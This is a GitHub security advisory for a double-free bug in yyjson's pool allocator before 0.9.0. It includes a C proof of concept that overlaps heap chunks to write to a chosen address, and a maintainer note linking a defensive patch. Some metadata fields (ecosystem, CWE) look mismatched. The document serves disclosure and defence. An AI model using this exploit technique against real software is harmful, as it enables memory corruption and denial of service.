# [H] yyjson has a Double Free vulnerability

## Summary
Severity: High
Advisory: GHSA-whx6-m9j4-w2m2
CVE: CVE-2024-25713
CWE: CWE-94
Ecosystem: SwiftURL
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L (CVSS_V3)
Published: 2024-02-29
Source: https://github.com/advisories/GHSA-whx6-m9j4-w2m2
Type: github-advisory

## Affected
- SwiftURL: `github.com/ibireme/yyjson` — affected >=0 <0.9.0

## Details
### Summary

The pool series allocator (pool_malloc/pool_free/pool_realloc) by yysjon has a Double Free vulnerability, which may lead to arbitrary address writing and Denial of Service (DoS) attacks.
Arbitrary address writing, combined with other legitimate or illegitimate operations of programs using this library, can lead to remote code execution.

### Details

The core cause of this vulnerability lies in the pool_free function's lack of loop checks, while the direct cause stems from the pool_free function and similar free-series functions not performing pointer destruction, resulting in Use-After-Free (UAF) vulnerabilities.

### PoC

Below, a C language program using yyjson 0.8.0 is written to show how to exploit a Double Free vulnerability to cause chunk overlaps, which then allows the modification of a chunk's next pointer to point to an arbitrary address. If the targeted address is valid, modifications can be made. However, if the address is invalid, it could lead to the program crashing, which could be exploited for a Denial of Service (DoS) attack. Additionally, constructing a cyclic chain of chunks could force the service into an infinite loop, also exploitable for a DoS attack.

```
#include <stdio.h>
#include "yyjson.h"

char test[0x110];
int64_t a=0xffffffff;
int64_t b= (int64_t) test;

int main() {

    size_t max_json_size = 64 * 1024;

    size_t buf_size = yyjson_read_max_memory_usage(max_json_size, 0);

    void *buf = malloc(buf_size);

    yyjson_alc alc;
    yyjson_alc_pool_init(&alc, buf, buf_size);

    yyjson_mut_doc *p1 = yyjson_mut_doc_new(&alc);
    yyjson_mut_doc *p2 = yyjson_mut_doc_new(&alc);
    yyjson_mut_arr(p2);

    yyjson_mut_doc *p3 = yyjson_mut_doc_new(&alc);

    yyjson_mut_doc_free(p2);
    yyjson_mut_doc_free(p2); // double free
    yyjson_mut_doc_free(p1);

    yyjson_read_flag flg = YYJSON_READ_ALLOW_COMMENTS | YYJSON_READ_ALLOW_INF_AND_NAN;


    for(int i=0;i<0x100;i++)test[i]= 'a';
    test[0x100]='\00';
    char *payload_f = "[%lld,43981]";

    char payload[100];
    sprintf(payload,payload_f,&a);
    yyjson_mut_doc *p4 = yyjson_read_opts(payload,strlen(payload),flg,&alc,NULL);

    yyjson_mut_doc *p5 = yyjson_mut_doc_new(&alc);
    yyjson_mut_doc *p6 = yyjson_mut_doc_new(&alc);
    yyjson_mut_doc *p7 = yyjson_mut_doc_new(&alc);
    yyjson_mut_doc *p8 = yyjson_mut_doc_new(&alc);
    for(int z=1;z<=100;z++)
    yyjson_mut_int(p8,0x63636363);

    printf("%s",test);
    free(buf);
    return 0;
}
```

### Impact
_What kind of vulnerability is it? Who is impacted?_

## Note from yyjson
yyjson_mut_doc_free() is well-documented:
https://github.com/ibireme/yyjson/blob/0.8.0/src/yyjson.h#L2090-L2093

```
/** Release the JSON document and free the memory.
    After calling this function, the `doc` and all values from the `doc` are no
    longer available. This function will do nothing if the `doc` is NULL.  */
void yyjson_mut_doc_free(yyjson_doc *doc);
```
If you have already called yyjson_mut_doc_free() on a doc, the doc and its internal values are invalid.
Any further operation on the doc or its values is undefined behavior.

While this is not a bug in yyjson itself, a defensive patch has been provided: [0eca326](https://github.com/ibireme/yyjson/commit/0eca326fe57aeeb866e6f04c9ef9ea9f8343157e)
If you mistakenly call yyjson_mut_doc_free() twice on the same doc against the documentation,
this patch will cause your program to crash immediately, alerting you to the incorrect usage.

## References
- https://github.com/ibireme/yyjson/security/advisories/GHSA-q4m7-9pcm-fpxh
- https://nvd.nist.gov/vuln/detail/CVE-2024-25713
- https://github.com/ibireme/yyjson/commit/0eca326fe57aeeb866e6f04c9ef9ea9f8343157e
- https://github.com/ibireme/yyjson
- https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6KQ67T4R7QEWURW5NMCCVLTBASL4ECHE
- https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NNICQVIF7BRYFWYRL3HPVAJIPXN4OVTX
- https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TKQPEREDUDKGYJMFNFDQVYCVLWDRO2Y2
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6KQ67T4R7QEWURW5NMCCVLTBASL4ECHE
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NNICQVIF7BRYFWYRL3HPVAJIPXN4OVTX
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TKQPEREDUDKGYJMFNFDQVYCVLWDRO2Y2
